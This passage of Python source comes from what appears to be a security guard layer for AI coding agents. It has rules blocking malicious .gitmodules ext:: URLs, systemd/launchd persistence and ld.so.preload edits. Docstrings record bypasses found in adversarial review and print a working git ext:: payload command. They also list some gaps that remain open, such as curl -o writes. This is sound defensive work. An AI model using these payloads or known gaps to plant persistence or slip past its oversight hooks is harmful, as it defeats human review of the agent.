    guard was permanently pinned to its hardcoded ``ask`` default through
    `aegis validate`/`aegis hook`/the CLI, with no warning — the same
    "works via `Policy(...)` in tests, dead via YAML in production" class
    of bug; (2) `MultiEdit`/`NotebookEdit` are `ActionClass.EDIT`, not MCP,
    and carry their text under `edits: [{new_string}, ...]`/`new_source`
    — gating the `_flatten_strings` fallback on `ev.action == MCP` (this
    guard's first draft) left both mainstream builtin tools completely
    unchecked, a silent total bypass, the identical bug class
    `rule_git_attributes_exec_protect`'s own docstring already discloses
    fixing once; (3) `GITMODULES_SECTION_INI_RE` is a single regex with
    two alternatives (url-scheme OR traversal) that the rule function only
    OR'd into `url_hit`, so a section matching purely via the traversal
    alternative reported the URL-scheme wording in the human-facing
    message — the gate/block decision was unaffected, only the
    explanation was factually wrong.

    A follow-up bypass-hunting-only round (round 2, against the round-1-
    fixed code) found and closed five further real, end-to-end-verified
    bypasses — all gave a silent ALLOW on a working `ext::` RCE or
    traversal payload, several under an explicit `mode: deny`: (1) a
    VALUE-ONLY Edit diff to `.gitmodules` itself (`old_string`/`new_string`
    covering just the changed value, no `url =`/`path =` key in either) —
    the single most severe finding of that round, closed by
    `GITMODULES_EXT_SCHEME_BARE_RE`/`GITMODULES_FILE_SCHEME_BARE_RE`/
    `GITMODULES_TRAVERSAL_BARE_RE`; (2) the identical value-only-diff shape
    against `.git/config`'s own `submodule.<name>.url` override, verified
    to actually run via real git (`git config submodule.x.url 'ext::touch
    PWNED'` + `git -c protocol.ext.allow=always submodule update --init`
    created the file), closed by scoping the `ext::` bare check to any
    confirmed git-config file, not just `.gitmodules`; (3) the same
    value-only-diff gap for `protocol.ext.allow`/`protocol.file.allow`,
    closed by `GITMODULES_PROTOCOL_ALLOW_CONTENT_RE`; (4) `patch`/`git
    apply` write `.gitmodules` via their own internal file write, which
    neither `WRITE_REDIRECT_RE` nor `INPLACE_WRITE_RE` recognized as a
    write verb, verified against real `patch -p1`/`git apply
    --unidiff-zero` in a scratch repo, closed by
    `GITMODULES_PATCH_APPLY_RE`; (5) `_GIT_ARGSKIP`'s bounded `{0,8}`
    flag-skip cap is, by construction, beatable by padding past it with
    enough real, valid, idempotent flags (confirmed as a genuinely valid,
    working command), closed by the same-clause
    `gitmodules_config_url_loose_hit`/`gitmodules_add_loose_hit` helpers.
    An earlier fix attempt for (5) used four chained `(?=...)` lookaheads
    in one regex and measured ~0.9-1.6s against a 20K-char adversarial
    input — a fail-open-on-hook-timeout risk caught and fixed (bounded
    same-clause helpers instead) before it ever reached this docstring's
    disclosed-gaps list. Round 2 also confirmed one genuine, accepted
    trade-off rather than a bug — see the relative-submodule-URL note in
    "Honest scope" above — and two source-level self-matches (this guard's
    own test fixtures/pattern source containing the literal dangerous INI
    shapes they test for) that are not bugs: every path-independent INI
    check in this file (`GIT_HOOKS_CONFIG_INI_RE`,
    `GIT_CONFIG_BANG_VALUE_INI_RE`, ...) has applied to file content
    regardless of destination extension since it was introduced, the same
    accepted trade-off, not new here."""
    cfg = getattr(policy, "gitmodules", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "gitmodules-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        a = ev.args or {}
        # `MultiEdit`/`NotebookEdit` are ActionClass.EDIT (see events.py),
        # not MCP, but put their text under `edits: [{new_string}, ...]`/
        # `new_source` — neither key a bare `content`/`new_string` lookup
        # checks, so gating the flatten fallback on `ev.action == MCP` (as
        # this guard's first draft did) left both mainstream builtin tools
        # completely unchecked, a silent total bypass (QA finding,
        # independent adversarial review). Falls through to the
        # depth-capped `_flatten_strings` walker for EVERY action class
        # whenever direct extraction doesn't yield a non-empty plain
        # string, the same fix `rule_git_attributes_exec_protect` already
        # applies for the identical bug class.
        raw_content = a.get("content")
        if not isinstance(raw_content, str) or not raw_content:
            raw_content = a.get("new_string")
        if isinstance(raw_content, str) and raw_content:
            content = raw_content
        else:
            content = " ".join(_flatten_strings(a))
        if not content:
            return None
        path_confirmed = bool(p and patterns.GITMODULES_PATH_RE.search(p))
        # `.git/config`'s own `submodule.<name>.url` override has the
        # identical live effect for an already-initialized submodule as a
        # `.gitmodules` edit — confirmed end-to-end against real git (QA
        # finding, independent adversarial review): `git config
        # submodule.subdir.url 'ext::touch PWNED'` followed by `git -c
        # protocol.ext.allow=always submodule update --init` actually ran
        # the payload. `GIT_CONFIG_FILE_PATH_RE` also matches a submodule's
        # own real `.git/modules/<name>/config`.
        path_confirmed_config = bool(p and patterns.GIT_CONFIG_FILE_PATH_RE.search(p))
        direct_url_hit = bool(
            path_confirmed and patterns.GITMODULES_URL_CONTENT_RE.search(content))
        direct_traversal_hit = bool(
            path_confirmed and patterns.GITMODULES_PATH_TRAVERSAL_RE.search(content))
        # `GITMODULES_SECTION_INI_RE` is a single regex with two
        # alternatives (dangerous URL scheme OR '..' traversal) — checking
        # it once and only ORing the result into `url_hit` misattributed
        # the reported reason to "URL scheme" even when the match came
        # purely from the traversal alternative with no url=ext::/file://
        # anywhere in the content (QA finding, independent adversarial
        # review: the gate/block decision was unaffected, only the
        # human-facing explanation was factually wrong). Disambiguated by
        # checking each alternative's own standalone regex against the
        # SAME path-independent content instead of relying on the combined
        # pattern's result for messaging.
        section_url_hit = bool(patterns.GITMODULES_URL_CONTENT_RE.search(content)
                                and patterns.GITMODULES_SECTION_INI_RE.search(content))
        section_traversal_hit = bool(patterns.GITMODULES_PATH_TRAVERSAL_RE.search(content)
                                      and patterns.GITMODULES_SECTION_INI_RE.search(content)
                                      and not section_url_hit)
        # Value-only diff (`old_string`/`new_string` covering just the
        # CHANGED VALUE, no `url =`/`path =` key in either) — see
        # `GITMODULES_EXT_SCHEME_BARE_RE`'s/`GITMODULES_TRAVERSAL_BARE_RE`'s
        # own docstrings in patterns.py for the full QA history; this was
        # the single most severe finding of that round (a silent ALLOW,
        # under `mode: deny` too, on a direct edit to `.gitmodules`
        # itself). `ext::` bare-matches on any confirmed git-config file
        # (no legitimate use anywhere); `file://` bare-matches on
        # `.gitmodules` only, NOT a generic git-config file, to avoid
        # false-positiving on an ordinary `git remote add origin
        # file:///path` local-mirror workflow — see that pattern's own
        # comment.
        bare_scheme_hit = bool(
            ((path_confirmed or path_confirmed_config)
             and patterns.GITMODULES_EXT_SCHEME_BARE_RE.search(content))
            or (path_confirmed and patterns.GITMODULES_FILE_SCHEME_BARE_RE.search(content)))
        bare_traversal_hit = bool(path_confirmed
                                   and patterns.GITMODULES_TRAVERSAL_BARE_RE.search(content))
        url_hit = direct_url_hit or section_url_hit or bare_scheme_hit
        traversal_hit = direct_traversal_hit or section_traversal_hit or bare_traversal_hit
        # Path-independent, same reasoning `GIT_HOOKS_CONFIG_INI_RE` uses: a
        # full "[protocol "ext"] ... allow =" block is high-signal on its own
        # regardless of destination filename. `GITMODULES_PROTOCOL_ALLOW_
        # CONTENT_RE` (bare `allow = <value>`, gated on a CONFIRMED
        # git-config path) closes the same value-only-diff class the scheme/
        # traversal bare checks above close — an Edit's new_string is
        # typically just the changed line, not the `[protocol "ext"]`
        # header (QA finding, independent adversarial review).
        protocol_hit = bool(patterns.GITMODULES_PROTOCOL_ALLOW_INI_RE.search(content)
                             or (path_confirmed_config
                                 and patterns.GITMODULES_PROTOCOL_ALLOW_CONTENT_RE.search(content)))
        if not (url_hit or traversal_hit or protocol_hit):
            return None
        if (os.environ.get("AEGIS_ALLOW_GITMODULES")
                or _gitmodules_allowed_by_policy(cfg, p)):
            return None
        target = f"'{p}'" if p else "A file"
        reason = (f"{target} is being written with a submodule URL using the "
                   "ext:: or file:// scheme" if url_hit else
                   f"{target} is being written with a submodule path "
                   "containing a '..' traversal segment" if traversal_hit else
                   f"{target} is being written enabling protocol.ext.allow/"
                   "protocol.file.allow")
        return _finish(Decision(action, "gitmodules-protect",
                         f"{reason} — it runs automatically, with the "
                         "invoking user's or CI's full privileges, on the "
                         "next `git clone --recurse-submodules`/`git "
                         "submodule update`. Review the change, then "
                         "confirm with AEGIS_ALLOW_GITMODULES=1; a spawned "
                         "agent cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        names_gitmodules = bool(patterns.GITMODULES_PATH_RE.search(cmd))
        # `patch`/`git apply` write `.gitmodules` via their OWN internal
        # file write — neither is a `>`-redirect nor an in-place-editor
        # invocation `WRITE_REDIRECT_RE`/`INPLACE_WRITE_RE` recognize (QA
        # finding, independent adversarial review, confirmed end-to-end
        # against real `patch`/`git apply`: a minimal unified-diff hunk
        # silently rewrote `.gitmodules` with zero detection). See
        # `GITMODULES_PATCH_APPLY_RE`'s own docstring in patterns.py.
        write_verb_hit = bool(patterns.WRITE_REDIRECT_RE.search(cmd)
                               or patterns.INPLACE_WRITE_RE.search(cmd)
                               or patterns.GITMODULES_PATCH_APPLY_RE.search(cmd))
        direct_url_hit = bool(
            names_gitmodules and patterns.GITMODULES_URL_CONTENT_RE.search(cmd)
            and write_verb_hit)
        direct_traversal_hit = bool(
            names_gitmodules and patterns.GITMODULES_PATH_TRAVERSAL_RE.search(cmd)
            and write_verb_hit)
        # Same section-INI disambiguation as the Edit/Write/MCP branch above
        # — see that branch's own comment for why the combined
        # `GITMODULES_SECTION_INI_RE` result alone can't tell url-scheme
        # from traversal-only for messaging purposes.
        section_url_hit = bool(patterns.GITMODULES_URL_CONTENT_RE.search(cmd)
                                and patterns.GITMODULES_SECTION_INI_RE.search(cmd))
        section_traversal_hit = bool(patterns.GITMODULES_PATH_TRAVERSAL_RE.search(cmd)
                                      and patterns.GITMODULES_SECTION_INI_RE.search(cmd)
                                      and not section_url_hit)
        # `GITMODULES_ADD_CLI_RE`/`GITMODULES_CONFIG_URL_CLI_RE`'s
        # fixed-position adjacency (`_GIT_ARGSKIP`'s bounded `{0,8}` token
        # cap) is beatable by padding past it with enough real, valid,
        # idempotent flags (QA finding, independent adversarial review,
        # confirmed as a genuinely valid, working command). The same-clause
        # loose-hit helpers close that class — see their own docstrings in
        # patterns.py.
        cli_url_hit = bool(patterns.GITMODULES_ADD_CLI_RE.search(cmd)
                            or patterns.GITMODULES_CONFIG_URL_CLI_RE.search(cmd)
                            or patterns.gitmodules_add_loose_hit(cmd)
                            or patterns.gitmodules_config_url_loose_hit(cmd))
        url_hit = direct_url_hit or section_url_hit or cli_url_hit
        traversal_hit = direct_traversal_hit or section_traversal_hit
        protocol_hit = bool(patterns.GITMODULES_PROTOCOL_ALLOW_RE.search(cmd)
                             or patterns.GITMODULES_PROTOCOL_ALLOW_INI_RE.search(cmd))
        if not (url_hit or traversal_hit or protocol_hit):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_GITMODULES")
                or _gitmodules_allowed_by_policy(cfg, _cmd(ev))):
            return None
        reason = ("A submodule URL using the ext:: or file:// scheme is "
                   "being set from a shell" if url_hit else
                   "A submodule path containing a '..' traversal segment is "
                   "being set from a shell" if traversal_hit else
                   "protocol.ext.allow/protocol.file.allow is being enabled "
                   "from a shell")
        return _finish(Decision(action, "gitmodules-protect",
                         f"{reason} — it runs automatically, with the "
                         "invoking user's or CI's full privileges, on the "
                         "next `git clone --recurse-submodules`/`git "
                         "submodule update`. A human may append "
                         "'# aegis-allow', or set AEGIS_ALLOW_GITMODULES=1; "
                         "a spawned agent cannot."))
    return None


def _service_persist_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_service_persist_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting/altering a systemd unit (``/etc/systemd/system/*.service``,
    ``/etc/systemd/user/*.service``, ``~/.config/systemd/user/*.service``,
    ``/usr/lib/systemd/{system,user}/*.service``, a ``*.timer``/``*.socket``/
    ``*.path``/``*.mount`` sibling, or a ``<unit>.service.d/override.conf``
    drop-in) or a launchd property list (``~/Library/LaunchAgents/*.plist``,
    ``/Library/LaunchAgents/*.plist``, ``/Library/LaunchDaemons/*.plist``),
    and block the two activation commands that flip an already-present unit
    into "runs automatically" without any file write of its own
    (``systemctl enable``/``reenable``/``link``/``edit``, ``launchctl load``/
    ``bootstrap``/``enable``, ``systemd-run --on-calendar``/``--on-boot``/...).

    THREAT MODEL: this is the Linux/macOS analog of the Windows scheduled-
    task/service persistence ``rule_containment``'s ``PERSIST_RE`` already
    denies non-escapably (``schtasks /create``, ``New-Service``, the
    ``...\\CurrentVersion\\Run`` registry key) — and shares the exact "runs
    later, unattended, with elevated or the human's full privileges" shape
    every ``*_protect`` guard in this file covers (``rule_mcp_config_protect``/
    ``rule_ci_workflow_protect``/``rule_git_hooks_protect``/
    ``rule_agent_def_protect``/``rule_shell_persist_protect``/
    ``rule_package_manifest_protect``/``rule_git_config_exec_protect``) — yet
    neither systemd nor launchd is reached by ANY existing guard: PERSIST_RE
    has zero systemd/launchd alternatives, and none of the path-based
    ``*_protect`` guards' patterns mention a unit file or a plist. A unit's
    ``ExecStart=`` (or a plist's ``ProgramArguments``) runs arbitrary code —
    on every future boot with root for a system unit or a LaunchDaemon, on
    every future login with the human's full privileges for a user unit or a
    LaunchAgent, or on a recurring ``OnCalendar``/``StartCalendarInterval``
    schedule for a timer — with no git operation, CI run, or agent-session
    restart required, and (like a git hook or a shell rc file) normally
    untracked by the project's own repo: invisible to ``git status``/
    ``git diff``/code review. Unlike the CI/CD workflow guard's target, the
    payload here never even leaves this machine to run on a remote runner —
    it fires locally, the very next time this machine boots or the human
    logs back in.

    Two file surfaces plus one command surface, matching the shape
    ``rule_shell_persist_protect``/``rule_git_config_exec_protect`` already
    split into "written directly" vs. "reached without ever appearing as a
    literal path/value in this call": (1) writing a NEW unit/plist file, (2)
    writing a drop-in override that hijacks an EXISTING, already-enabled,
    ostensibly-trusted unit — the same "hijack a legitimate target that's
    already wired up" shape ``CI_WORKFLOW_PATH_RE``'s own comment describes
    for a pipeline step, and (3) the activation command itself, which is
    dangerous even with no accompanying file write in the same shell call —
    a unit planted by an earlier, separate tool call this guard's write-verb
    checks never saw, shipped disabled by a compromised package, or merely
    left present-but-inactive by a previous session, all become "runs
    automatically from now on" the moment ``systemctl enable``/
    ``launchctl load`` runs.

    Config (``policy.service_persist``): ``mode`` (deny|ask|monitor|off,
    default ask), ``allow`` (regexes on the path/command that skip the gate
    — a repo's own trusted systemd-unit deploy script, say). Defaults to
    ``ask`` for the same reason every sibling ``*_protect`` guard does:
    shipping a systemd unit for one's own application, or enabling a
    launchd agent for a dev tool, is routine, sanctioned work — it just
    needs a human to have actually looked at it before it goes live.

    Escapable only by a human: a trailing '# aegis-allow' on the shell form,
    or the env toggle ``AEGIS_ALLOW_SERVICE_PERSIST=1`` set by the
    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
    spawned agent cannot set its own env for a hook invocation it doesn't
    control, so neither path is agent-self-escapable — the same "an agent
    can't wave itself past its own guard" invariant every escapable guard in
    this file holds.

    Honest scope, the same denylist trade-offs every guard in this file
    discloses: a path assembled indirectly (shell variable concatenation
    across separate assignments, a ``for``/``xargs`` loop, ``basename``/
    ``dirname`` reconstruction) rather than appearing as one contiguous
    literal is not caught; the bare extensions ``.plist``/``.timer``/
    ``.service`` are deliberately excluded from the ``find``-indirection
    fallback (too generic — an ordinary iOS/macOS project's ``Info.plist``,
    or an unrelated tool's own ``.service`` convention, carries no
    systemd/launchd-specific signal on its own, the same "too generic"
    trade-off ``SHELL_PERSIST_FIND_RE`` already accepts for the bare words
    "config"/"profile"); a direct fetch-to-file write (``curl -o
    ~/Library/LaunchAgents/x.plist``) is caught by none of the shell
    branch's five write-verb checks — the same inherited gap
    ``rule_ci_workflow_protect``/``rule_git_hooks_protect``/
    ``rule_agent_def_protect``/``rule_shell_persist_protect`` already
    disclose, not new or worse here; and an environment-variable override
    that relocates where systemd looks for user units (``$XDG_CONFIG_HOME``,
    defaulting to ``~/.config``) is not covered when set to a directory this
    guard's patterns don't otherwise recognize — the same
    "computed-indirectly, not a literal path" class of gap
    ``rule_shell_persist_protect``'s own docstring already accepts for
    ``$ZDOTDIR``/fish's ``$XDG_CONFIG_HOME``; ``launchctl submit`` (runs a
    command immediately, directly from argv, no plist ever written) and
    ``launchctl kickstart -k`` (restarts an already-loaded job) are, like a
    plain ``systemd-run`` with no ``--on-*`` flag (see
    ``test_systemd_run_oneshot_not_gated``), an IMMEDIATE run rather than a
    persistence-installing one and so deliberately not gated — consistent
    with, not new relative to, this guard's own "activation, not execution,
    is what's gated" design; and only unit types capable of carrying an
    ``ExecStart=``-equivalent directive are covered — see ``_UNIT_EXT``'s own
    comment in ``patterns.py`` for the excluded, execution-incapable types.

    QA history (two independent adversarial reviews, run in parallel, same
    convention ``rule_git_config_exec_protect`` used): round A (bypass
    hunting) found ``SERVICE_ACTIVATE_CMD_RE``'s original scan-gap bound
    (40/60/20 chars between the command and its verb) was ITSELF a bypass —
    an entirely ordinary intervening flag (``systemctl --root=/mnt/some/
    long/alternate/rootfs enable evil.service``, ``launchctl asuser <uid>
    load ...``) pushed the verb outside the window and the whole command
    sailed through unflagged even with the target path present verbatim in
    the text; fixed by widening to 200, the same bound
    ``_find_predicate_re`` already uses for an analogous "verb...target can
    be arbitrarily far apart within one clause" shape (see
    ``SERVICE_ACTIVATE_CMD_RE``'s own comment in ``patterns.py``). Round B
    (design/consistency) confirmed the guard's structure, escape hatches,
    and registration (``_CORE_RULES``, ``Policy``, README, ``skills.py``)
    all match sibling-guard convention with no gaps, and flagged the missing
    doubled-separator/Windows-trim regression coverage this docstring's
    sibling tests already carry — added, see
    ``test_doubled_separator_does_not_bypass`` in this guard's test file."""
    cfg = getattr(policy, "service_persist", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "service-persist-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        unit_hit = bool(p and patterns.SYSTEMD_UNIT_PATH_RE.search(p))
        plist_hit = bool(p and patterns.LAUNCHD_PLIST_PATH_RE.search(p))
        if not (unit_hit or plist_hit):
            return None
        if os.environ.get("AEGIS_ALLOW_SERVICE_PERSIST") or _service_persist_allowed_by_policy(cfg, p):
            return None
        reason = (f"Systemd unit '{p}' is being written — its ExecStart runs "
                   "automatically, on a future boot or login, once enabled"
                   if unit_hit else
                   f"Launchd property list '{p}' is being written — its "
                   "ProgramArguments runs automatically the next time this "
                   "machine boots or the human logs in")
        return _finish(Decision(action, "service-persist-protect",
                         f"{reason}. Review the change, then confirm with "
                         "AEGIS_ALLOW_SERVICE_PERSIST=1; a spawned agent cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        names_target = bool(patterns.SYSTEMD_UNIT_PATH_RE.search(cmd)
                             or patterns.LAUNCHD_PLIST_PATH_RE.search(cmd)
                             or patterns.SERVICE_PERSIST_DIR_RE.search(cmd)
                             or patterns.service_persist_find_hit(cmd))
        touches_target = names_target and (
            patterns.WRITE_REDIRECT_RE.search(cmd)
            or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
            or patterns.DESTRUCTIVE_DELETE_RE.search(cmd)
            or patterns.INPLACE_WRITE_RE.search(cmd)
            or patterns.FORCED_LINK_WRITE_RE.search(cmd)
            or patterns.ARCHIVE_SYNC_VERB_RE.search(cmd))
        activates = bool(patterns.SERVICE_ACTIVATE_CMD_RE.search(cmd))
        if not (touches_target or activates):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_SERVICE_PERSIST")
                or _service_persist_allowed_by_policy(cfg, _cmd(ev))):
            return None
        reason = ("A systemd unit/timer or launchd plist is being modified "
                   "from a shell" if touches_target else
                   "A systemd/launchd unit is being enabled/loaded, running "
                   "its target automatically")
        return _finish(Decision(action, "service-persist-protect",
                         f"{reason} — it runs automatically, unattended, on a "
                         "future boot or login. A human may append "
                         "'# aegis-allow', or set "
                         "AEGIS_ALLOW_SERVICE_PERSIST=1; a spawned agent "
                         "cannot."))
    return None


def _ld_preload_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_ld_preload_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting/altering the dynamic linker's preload list
    (``/etc/ld.so.preload``) or its shared-library search-path config
    (``/etc/ld.so.conf``, ``/etc/ld.so.conf.d/*.conf`` drop-ins).

    THREAT MODEL: ``/etc/ld.so.preload`` is glibc's dynamic-linker preload
    list -- every shared-object path listed in it is ``dlopen()``'d into
    EVERY dynamically-linked ELF binary the system execs from that point
    forward: any user, any binary (including setuid ones, ``sudo``, ``ssh``,
    package managers, cron jobs, other users' sessions), with no
    per-process opt-in and no reboot/new-shell/CI/git trigger needed at
    all -- the very next ``exec()`` anywhere on the machine picks it up.
    This is the actual mechanism real Linux userland rootkits (Jynx,
    Azazel, and the wider "LD_PRELOAD rootkit" family) use to wrap libc
    calls (``readdir``/``getdents``, ``accept``, ...) process-wide to hide
    files/PIDs/backdoor connections from every subsequently-run tool,
    including the very ones an operator would use to look for them. Its
    blast radius meets or exceeds ``rule_service_persist_protect``'s own:
    every future process on the machine, not just units systemd/launchd
    itself launches at boot/login.

    ``/etc/ld.so.conf``/``/etc/ld.so.conf.d/*.conf`` are the softer
    sibling: they extend the shared-LIBRARY search path ``ldconfig``/
    ``ld.so`` consult, so a directory added there ahead of a legitimate one
    lets a same-named malicious ``.so`` shadow it for every subsequent
    dynamic link -- the ELF/shared-library analog of
    ``rule_path_hijack_protect``'s own ``$PATH``-binary-shadow guard, one
    layer down (the loader's search path, not the shell's).

    Nothing else in this file reaches this surface: ``rule_containment``'s
    ``PERSIST_RE`` covers Windows scheduled tasks/services/registry Run
    keys, not a Linux linker config path; ``rule_service_persist_protect``
    covers systemd/launchd process-supervision units, a different auto-run
    mechanism (a service manager launching a program, not the ELF loader
    injecting a library into one already running); ``rule_path_hijack_
    protect`` covers shadowing a ``$PATH`` *binary*, not a *shared library*
    reached via the loader's own search path; ``rule_pysite_protect``
    covers the analogous Python interpreter-startup auto-exec mechanism but
    never touches the OS-level ELF loader underneath it.

    Config (``policy.ld_preload``): ``mode`` (deny|ask|monitor|off, default
    ask), ``allow`` (regexes on the path/command that skip the gate --
    e.g. a repo's own trusted deploy script that provisions an EDR/
    observability agent this way). Defaults to ``ask`` for the same reason
    every sibling ``*_protect`` guard does: legitimate uses of this exact
    mechanism exist (security/EDR agents, APM/observability instrumentation,
    malloc-debugging libraries deliberately preloaded process-wide) -- it
    just needs a human to have actually looked at the change once.

    Escapable only by a human: a trailing '# aegis-allow' on the shell
    form, or the env toggle ``AEGIS_ALLOW_LD_PRELOAD=1`` set by the
    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
    spawned agent cannot set its own env for a hook invocation it doesn't
    control, so neither path is agent-self-escapable -- the same "an agent
    can't wave itself past its own guard" invariant every escapable guard
    in this file holds.

    Honest scope, the same denylist trade-offs every guard in this file
    discloses: a path assembled indirectly (shell variable concatenation
    across separate assignments, a ``for``/``xargs`` loop, ``basename``/
    ``dirname`` reconstruction) rather than appearing as one contiguous
    literal is not caught, the same class every sibling guard already
    accepts; a direct fetch-to-file write (``curl -o /etc/ld.so.preload
    ...``, ``wget -O ...``) is caught by none of the shell branch's five
    write-verb checks, the same inherited gap every other guard in this
    file already discloses; the bare parent directory ``/etc`` is
    deliberately excluded from both the archive/sync bare-directory
    fallback and the ``find``-indirection fragment list (too generic --
    almost every project's build touches some ``/etc`` path), the same
    "too generic" trade-off ``SHELL_PERSIST_FIND_RE``'s own docstring
    already makes for the bare words "config"/"profile"; an MCP tool
    naming its target argument outside ``_path()``'s recognized key list
    is missed the same way it is for every other ``_path()``-based guard
    in this file (a shared limitation of the helper itself, out of this
    guard's scope to fix); and, unlike most sibling guards' targets,
    ``/etc/ld.so.preload``'s path is fixed inside glibc, not relocatable
    via an environment variable for ordinary (non-setuid) processes the
    way ``$ZDOTDIR``/``$XDG_CONFIG_HOME`` relocate ``rule_shell_persist_
    protect``/``rule_service_persist_protect``'s own targets -- so this
    guard has no equivalent env-var-relocation gap to disclose.

    QA history (two independent adversarial reviews, run in parallel, same
    convention every guard in this file follows): design/consistency review
    verified the wiring correct everywhere its siblings are (``_CORE_RULES``,
    ``Policy``, all three ``loader.py`` spots -- round-tripped an actual YAML
    ``ld_preload:`` block through ``load_policy()`` into a live ``evaluate()``
    decision rather than trusting the wiring by inspection alone -- both
    ``skills.py`` knob lists, the README guard table), confirmed the full
    suite green throughout, and flagged two gaps: this docstring's own
    disclosed trade-offs (the bare-``/etc`` exclusion, the ``curl -o``
    inherited gap, the ``_path()`` MCP-arg-key limitation) had no matching
    README Limits-section paragraph the way every sibling guard from CI/CD
    workflow through ``pysite`` gets one -- added; and this guard's test file
    was missing the Windows-trailing-dot regression coverage its closest
    sibling (``rule_service_persist_protect``) carries for the identical
    ``_WIN_TRIM``/``_SEP`` mechanism -- added. Bypass-hunting found and
    closed one real, reproduced bypass: a ``find -regex``/``-iregex`` value
    with its interior literal dots escaped (``'.*ld\\.so\\.preload.*'`` --
    the textbook-correct, ERE-idiomatic way to write one, the same style
    this file's own ``AGENT_DEF_FIND_PREDICATE_RE`` comment demonstrates)
    inserted a literal backslash between "ld"/"so"/"preload" in the scanned
    text, breaking the plain substring-adjacency match the find-fragment
    pattern originally required -- unlike this file's other find-fragments
    (at most one leading dot), "ld.so.preload"/"ld.so.conf.d" have two/three
    INTERIOR dots, uniquely exposing this guard to the escaping trick; fixed
    by tolerating an optional literal backslash before each dot in the
    fragment itself -- see ``LD_PRELOAD_FIND_RE``'s own comment in
    ``patterns.py`` for the fix and its own accepted residual gap (a
    bracket-class or other non-backslash ERE dot-spelling is still not
    covered, the same "computed indirectly, unbounded to fully chase" class
    every find-fallback in this file already accepts). Bypass-hunting also
    confirmed, without fixing (pre-existing, shared-infrastructure, not new
    or worse here): the ``curl -o``/``wget -O`` gap; a bare ``install`` verb
    with no mode flag; MCP alternate-arg-key misses outside ``_path()``'s
    list; a heredoc-form interpreter write with no ``-c``/``-e`` flag; and a
    same-clause false ASK when an unrelated write verb and an incidental
    path mention share a clause -- reproduced identically against
    ``rule_service_persist_protect``/``rule_shell_persist_protect`` on
    analogous inputs, confirming it is an inherited trait of the shared
    ``touches_target = names_target and (verb...)`` shape, not unique to
    this guard. Traced line-by-line against ``rule_service_persist_
    protect``/``rule_shell_persist_protect`` and found no structural
    inconsistency in mode/monitor/off handling (including the YAML-boolean
    ``False`` case), the allow-regex escape hatch, ``_finish``/
    ``_record_monitor`` wiring, the five-verb ``touches_target`` set, or the
    agent-proof ``_override_allowed``/env-toggle escape hatches. Recommended
    PASS after the two fixes; no further round needed. Full suite green
    throughout (1516 passed after the fixes' own regression tests)."""
    cfg = getattr(policy, "ld_preload", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "ld-preload-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        preload_hit = bool(p and patterns.LD_PRELOAD_PATH_RE.search(p))
        conf_hit = bool(p and patterns.LD_SO_CONF_PATH_RE.search(p))
        if not (preload_hit or conf_hit):
            return None
        if os.environ.get("AEGIS_ALLOW_LD_PRELOAD") or _ld_preload_allowed_by_policy(cfg, p):
            return None
        reason = (f"Dynamic-linker preload list '{p}' is being written — every "
                   "shared object it names is loaded into EVERY dynamically-"
                   "linked program run on this machine from now on, by any "
                   "user, with no reboot or new shell needed" if preload_hit else
                   f"Dynamic-linker search-path config '{p}' is being written — "
                   "a directory added here can shadow a legitimate shared "
                   "library for every subsequent dynamic link")
        return _finish(Decision(action, "ld-preload-protect",
                         f"{reason}. Review the change, then confirm with "
                         "AEGIS_ALLOW_LD_PRELOAD=1; a spawned agent cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        names_target = bool(patterns.LD_PRELOAD_PATH_RE.search(cmd)
                             or patterns.LD_SO_CONF_PATH_RE.search(cmd)
                             or patterns.LD_PRELOAD_DIR_RE.search(cmd)
                             or patterns.ld_preload_find_hit(cmd))
        touches_target = names_target and (
            patterns.WRITE_REDIRECT_RE.search(cmd)
            or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
            or patterns.DESTRUCTIVE_DELETE_RE.search(cmd)
            or patterns.INPLACE_WRITE_RE.search(cmd)
            or patterns.FORCED_LINK_WRITE_RE.search(cmd)
            or patterns.ARCHIVE_SYNC_VERB_RE.search(cmd))
        if not touches_target:
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_LD_PRELOAD")
                or _ld_preload_allowed_by_policy(cfg, _cmd(ev))):
            return None
        return _finish(Decision(action, "ld-preload-protect",
                         "The dynamic linker's preload list or search-path "
                         "config is being modified from a shell — it affects "
                         "every dynamically-linked program run on this "
                         "machine from now on, with no reboot or new shell "
                         "needed. A human may append '# aegis-allow', or set "
                         "AEGIS_ALLOW_LD_PRELOAD=1; a spawned agent cannot."))
    return None


